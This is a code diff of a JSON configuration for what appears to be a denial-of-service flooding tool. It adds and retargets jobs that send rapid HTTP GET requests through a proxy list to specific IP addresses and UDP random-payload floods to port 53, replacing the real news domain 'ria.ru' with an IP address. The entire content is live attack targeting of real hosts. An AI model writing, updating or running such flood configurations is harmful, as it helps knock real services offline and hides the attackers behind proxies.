@@ -123,22 +123,10 @@
     },
     {
       "type": "http",
+      "count": 3,
       "args": {
         "method": "GET",
         "path": "http://178.248.233.32:80/",
-        "interval_ms": 1,
-        "client": {
-          "async": true,
-          "proxy_urls": "{{ get_proxylist }}"
-        }
-      }
-    },
-    {
-      "type": "http",
-      "count": 2,
-      "args": {
-        "method": "GET",
-        "path": "http://178.248.237.238:443/",
         "interval_ms": 1,
         "client": {
           "async": true,
@@ -149,7 +137,7 @@
     {
       "type": "udp",
       "args": {
-        "address": "ria.ru:53",
+        "address": "178.248.236.20:53",
         "interval_ms": 5,
         "body": "{{ random_payload 128 }}"
       }
